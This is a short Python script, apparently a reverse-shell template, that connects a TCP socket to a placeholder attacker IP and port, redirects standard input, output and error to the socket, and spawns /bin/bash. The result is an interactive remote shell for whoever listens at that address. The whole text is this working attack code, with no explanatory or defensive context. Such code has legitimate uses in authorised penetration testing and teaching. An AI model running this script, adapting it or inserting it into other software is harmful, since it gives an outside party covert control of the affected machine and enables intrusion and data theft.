import socket
import os
import pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<Your_IP>", <Your_Port>))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/bash")
